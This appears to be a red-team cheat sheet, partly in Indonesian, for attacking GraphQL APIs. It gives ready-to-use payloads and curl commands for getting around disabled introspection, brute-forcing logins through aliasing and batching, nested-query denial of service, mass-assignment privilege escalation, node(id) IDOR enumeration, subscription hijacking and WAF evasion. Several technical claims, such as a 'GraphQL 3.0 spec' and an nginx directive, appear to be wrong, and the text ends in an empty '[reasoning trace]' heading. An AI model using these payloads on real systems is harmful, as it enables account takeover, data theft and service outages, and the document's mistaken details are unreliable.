# graphql — api

# GraphQL: Attack & Defense Reference (Red Team)

## 1. Introspection

**What is sent:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```
POST to `/graphql`, header `Content-Type: application/json`, body `{"query":"..."}`.

**What appears:** full schema dump (types, fields, arguments, enums). In proper GraphQL servers (graphql-js ≥ 15, Apollo Server ≥ 3), introspection is on-by-default; sometimes off in prod.

**Why it succeeds/fails:** succeeds if the server does not disable it; fails (`"Introspection is disabled"` / `GRAPHQL_VALIDATION_FAILED`) if `NoSchemaIntrospectionCustomRule` is installed.

## 2. Bypass Introspection Disabled

**Techniques sent:**

| Technique | Payload / Prerequisite | Effect |
|---|---|---|
| Field suggestion | Wrong field query: `{ user { passwrd } }` | Error `Did you mean "password"?` — leaks field names |
| Alias bypass rule | `{ a:__schema { types { name } } }` | Kadang rule salah-matching nama |
| GraphQL 3.0 spec `__Type.kind` traversal | `{ __type(name:"User"){ fields{ name } } }` | `__type` is often not blocked even when `__schema` is blocked — try one by one |
| HTTP method switch | GET `?query={__schema{types{name}}}` | Blocking middleware usually only covers POST |
| Content-Type | `application/graphql`, `text/plain` | Parser custom kadang lolos |
| Path switch | `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql`, `/graphql/console` | Route berbeda = rule berbeda |
| `@include`/`@skip` | `{ __schema @include(if:true){ types{name} } }` | Error message berbeda = oracle |
| Playground/GraphiQL | GET `/graphiql`, `/playground`, `/altair` | Often not guarded |

**Cek cepat:**
```bash
curl -s -X POST https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}}}"}' | jq .

curl -s "https://t/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"

curl -s -X POST https://t/graphql -H 'Content-Type: application/graphql' \
  --data '{__schema{types{name}}}'
```

**Why it succeeds:** some implementations whitelist fields via a static schema that does not include `__schema`/`__type`, or block only on one route/method.

## 3. Field Suggestion Brute Force

**What is sent:** a query containing misspelled fields/arguments; the server returns suggestions.

```graphql
{ user(id:1) { passwrd } }
```
Response:
```json
{"errors":[{"message":"Cannot query field \"passwrd\" on type \"User\". Did you mean \"password\"?"}]}
```

Loop ejaan umum: `pass`, `pwd`, `passwd`, `passw`, `passwor`, `hash`, `pwhash`, `secret`, `token`, `apiKey`, `api_key`, `credential`.

**Why it succeeds:** `graphql-js` enables `didYouMean` by default; `ValidationContext` returns Levenshtein suggestions. Fails if the server sets `NoDeprecatedCustomRule` + `custom validation` that suppresses suggestions, or if the type is `@deprecated` and the field is hidden.

## 4. Batching & Aliasing for Brute Force

**Aliasing (single request, banyak field):**
```graphql
mutation {
  a0: login(email:"a@x", password:"pass1") { token }
  a1: login(email:"a@x", password:"pass2") { token }
  a2: login(email:"a@x", password:"pass3") { token }
  # ... hingga ratusan
}
```
The response contains an array of aliases; bypasses per-IP/per-account rate-limit if the limiter counts requests rather than operations.

**Query batching (JSON array):**
```json
[
  {"query":"mutation($p:String!){login(password:$p){token}}","variables":{"p":"pass1"}},
  {"query":"mutation($p:String!){login(password:$p){token}}","variables":{"p":"pass2"}}
]
```
POST body is an array — many GraphQL servers (Apollo Server, graphql-yoga) process it as a batch. A request-count-based limiter in nginx `limit_req` (`nginx 1.25`) will see only 1 request.

**Additional rate-limit bypass:** HTTP/2 multiplexing (Chrome 131 default) multiplies streams over 1 connection; the limiter is per-connection, NOT per-stream.

**Why it succeeds:** the auth code calls the resolver per alias/batch; per-account lockout is not maintained. Fails if operations are batched and `@unique`-type enforcement forces one operation per request, or if the resolver shares a mutex + `userId` counter regardless of alias.

**Verification payload:** send `mutation { a:__typename b:__typename ... }` ×5000 — if the response is ~seconds without a 429, batching passes.

## 5. Nested Query DoS

**What is sent:** recursive query via circular relations (`User.friends.friends...`) or recursive fragments.

```graphql
query D {
  user(id:1) {
    friends(first:100) { friends(first:100) { friends(first:100) {
      friends(first:100) { friends(first:100) { friends(first:100) { id } } }
    } } }
  }
}
```
Or alias amplification:
```graphql
{ u1:user(id:1){id} u2:user(id:2){id} ... u1000:user(id:1000){id} }
```
Or recursive fragments (if the validator is weak):
```graphql
fragment F on User { friends { ...F } }
{ user(id:1){ ...F } }
```

**What appears:** query timeout 30s+, worker pool full, 502/504 from nginx 1.25 (`proxy_read_timeout 30s`).

**Why it succeeds:** server without *query depth limit* (`graphql-depth-limit`), without *complexity analysis* (`graphql-cost-analyzer`, `@graphql-cost`), without `maxAliases`/`maxTokens`. graphql-js itself does NOT limit depth. Fails if `graphql-armor` (`maxDepth:10`, `costLimit`) or Apollo `queryLimits` is installed.

**Quick check:** send depth 20 dummy; 200 → no limit. Depth 500 → if 200 and slow, DoS is viable.

## 6. Mutation Abuse

**What is sent:**
```graphql
mutation {
  updateUser(id:"victim", input:{email:"attacker@evil"}) { id email }
}
```
Or via batching: hundreds of `updateUser` in one request; or chained mutations creating an account then escalating role (`role:"admin"` if the `UserInput` inputType does not filter).

**Pola umum:**
- Mass-assignment: `input:{role:"admin",isAdmin:true,verified:true}` on registration/profile-update mutations.
- Enum abuse: `role: ADMIN` if the enum is accepted directly.
- Chained: `register` → `verifyEmail(token from response)` → `login` → `updateUser(role:ADMIN)` in one operation.

**Why it succeeds:** no resolver-level input filtering; the schema allows privileged fields in common input types. Fails if the server uses an input allowlist (`pick`), separate `inputType` for user vs admin, or per-field authorization (`@auth(requires:ADMIN)` directive).

## 7. IDOR via `node(id:)` (Relay Global ID)

**What is sent:**
```graphql
{
  node(id:"VXNlcjox") { id ... on User { email phone }
                         ... on Admin { secrets }
                         ... on Order { total cardLast4 } }
}
```
Relay `id` = base64 of `"<Type>:<PK>"`. Quick decode:
```bash
echo 'VXNlcjox' | base64 -d   # User:1
echo -n 'User:1' | base64     # VXNlcjox
```

**Enumerasi tipe:**
```graphql
{ a:node(id:"VXNlcjox"){ ... on User {id} }
  b:node(id:"QWRtaW46MQ=="){ ... on Admin {id} }
  c:node(id:"T3JkZXI6MQ=="){ ... on Order {id total} } }
```

**What appears:** another user's object if the `node(id)` resolver does not check ownership + does not check the actual type. `... on X` only renders X's fields, but the resolved object is still based on `id`.

**Why it succeeds:** Relay-style `node` interface implementations usually map ID → object without `authorize(user, object)`. Fails if the `node` resolver is wrapped with `@auth` at the scalar level or `id` = opaque HMAC (not plaintext base64).

**Cek otomatis:** ganti `User:1` → `User:2`, bandingkan respons. Bila `email`/`phone` muncul → confirmed IDOR.

## 8. Subscription Authorization

**What is sent:**
```graphql
subscription {
  userUpdated(userId:"victim-uuid") { id email role lastLogin }
}
```

Over websocket (`graphql-ws` protocol, or `graphql-transport-ws`):
```
CONNECT → {"type":"connection_init","payload":{"Authorization":"Bearer <token>"}}
       ← {"type":"connection_ack"}
SUBSCRIBE id=1 → {"id":"1","type":"subscribe","payload":{"query":"subscription{userUpdated(userId:\"victim\"){email}}"}}
```

**Bypass umum:**
- Auth only in `connection_init`, not in `SUBSCRIBE`. Anonymous connection then subscribes to `userUpdated` without a filter → receives updates for the entire tenant.
- `onConnect` is not re-invoked per-topic, so expired/irrelevant tokens are accepted.
- Auth via `connectionParams` but the server checks `context.user` once at handshake.

**What appears:** `next` frame containing another user's object payload; or `next` directly without error.

**Why it succeeds:** subscription authz logic is often only in `onConnect`, not in `onSubscribe`/the subscribe resolver (`subscribe()` function). Fails if the server validates per `SUBSCRIBE` and applies a `userId == context.user.id` filter.

**Check:** with user A's token, subscribe to `userUpdated(userId: <B>)`; if B's data stream comes through → broken object-level authz on the subscription.

Tool: `graphql-ws-client` npm, or `wscat -c wss://t/graphql -s graphql-transport-ws` then send manual frame.

## 9. Tooling

| Tool | Version (min) | Main command |
|---|---|---|
| **graphql-cop** | 1.x | `graphql-cop -t https://target/graphql -o json` |
| **InQL** (Burp ext / CLI) | 4.x | `inql -t https://target/graphql -o ./out` or via Burp BApp |
| **clairvoyance** | 0.4.x | `clairvoyance https://target/graphql -o schema.json -w wordlist.txt -H "Authorization: Bearer $TOK"` |
| **graphql-map** | 0.1 | `graphql-map -e https://target/graphql -H "Cookie: $C"` to fuzz IDOR |
| **graphw00f** | 1.1.x | `graphw00f -d -f -t https://target/graphql` to fingerprint engine |
| **Altair / GraphiQL** | — | manual Explore tab |

**graphql-cop — the output to look for:**
```json
[
 {"title":"Introspection","description":"...","severity":"INFO","result":true},
 {"title":"Field Suggestions","severity":"LOW","result":true},
 {"title":"GraphiQL","severity":"MEDIUM","result":true},
 {"title":"GET Method Support","severity":"LOW","result":true},
 {"title":"Query Batching","severity":"LOW","result":true},
 {"title":"Alias Overloading","severity":"LOW","result":true},
 {"title":"Directives Overloading","severity":"LOW","result":true}
]
```

**InQL — alur:**
1. Generate query templates from schema.
2. Kirim via repeater, filter `node`, `edges`.
3. Fuzz ID in the IDOR template.

**clairvoyance — saat introspection disabled:**
```bash
clairvoyance https://t/graphql -o schema.json \
  -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
  -H 'Authorization: Bearer <TOK>' -i 10
```
Reconstructing schema from field-suggestion error. Limitation: requires server to enable `didYouMean`; if disabled → not effective.

## 10. Operational Pitfalls in the Field

| Pitfall | Why it fails | Red-team mitigation |
|---|---|---|
| **graphql-js `NoSchemaIntrospectionCustomRule` enabled** | `__schema` & `__type` error; doesn't mean field suggestion is off | Check `didYouMean` first; use clairvoyance |
| **Persisted queries (APQ / Relay)** | Server only allows hashed queries; random payload rejected with `PersistedQueryNotFound` | Extract hash manifest, replay original query; or find non-APQ endpoint |
| **PersistedQueriesOnly at gateway** | All arbitrary queries rejected at edge (Apollo Router, WunderGraph) | Focus on internal backend endpointGraphQL; bypass via header `x-apollo-operation-name` if leaked |
| **Field suggestion disabled** | `Did you mean` doesn't appear → clairvoyance empty | Manual fuzz field enumeration from type errors (`Cannot query field` vs `Cannot return null`) |
| **Batching disabled at gateway** | Array body rejected 400 | Check `allowBatching:false` (Apollo Server 4 default batching can still be on); fallback alias |
| **Rate-limit per-operation (similar)** | 429 after N operations in 1 request | Split into several requests, jitter 50-200ms |
| **Depth-limit at edge (graphql-armor)** | Depth >10 → 400 `maxDepthExceeded` | Use breadth-amplification (many aliases) instead of depth |
| **WAF ModSecurity + OWASP CRS** (nginx 1.25 + CRS 4.x) | `__schema` payload often blocked in JSON body if `paranoia-level` ≥2 | Encoded unicode `\u005f_`, change method to GET, change Content-Type |
| **`subscription` guarded by `connection_init` auth** | Anonymous rejected on connect | Use valid account then target victim's `userId` (IDOR subscription) |
| **Apollo Server 4 `csrfPrevention: true`** | POST `application/json` without `apollo-require-preflight` → 400 | Send header `apollo-require-preflight: true` + `x-apollo-operation-name` |
| **Persisted mutation (`@defer`/`@stream`)** | Partial response; parsing tools often wrong | Normalize response by `path` field |
| **GraphQL over HTTP GET blocked** | Rate-limit per-IP at CDN (Cloudflare) | Multiplexing HTTP/2 (Chrome 131) or WebSocket `graphql-ws` |
| **`node(id:)` opaque HMAC** | Base64 tamper fails; IDOR dead | Focus enumeration via other fields (`userByEmail`, `orderByNumber`) |
| **Enum types in `inputType` whitelisted by server** | Mutation abuse `role:ADMIN` rejected | Chain through another mutation (`inviteUser(role:"admin")`) that has separate check |
| **Deprecated fields hidden from introspection** | `password` field doesn't appear in schema dump | Send `includeDeprecated:true` in `__type.fields`; if server still hides → fuzz via error |
| **Introspection disabled + field suggestion disabled + APQ active** | All enumeration blind | Time out — pivot to `REST /api/*` endpoint or exposed gRPC gateway |

**Angka acuan cepat:**
- `graphql-js` >= 16.8 default `didYouMean` aktif.
- `graphql-armor` defaults: `maxDepth:6`, `maxAliases:15`, `costLimit:5000`, `maxTokens:1000`.
- `Apollo Server 4` default `csrfPrevention:true` butuh header `apollo-require-preflight`.
- `graphql-ws` protocol `graphql-transport-ws` (not the old `graphql-ws`) — protocol mismatch = connection closed 1002.
- `nginx 1.25`: `client_max_body_size` default 1m — large batch truncated 413; increase via `large_client_body` or split.
- `Clairvoyance` throughput ~3-10 fields/second (network bound); 5000-word wordlist ≈ 10-25 minutes.

---

## [reasoning trace]


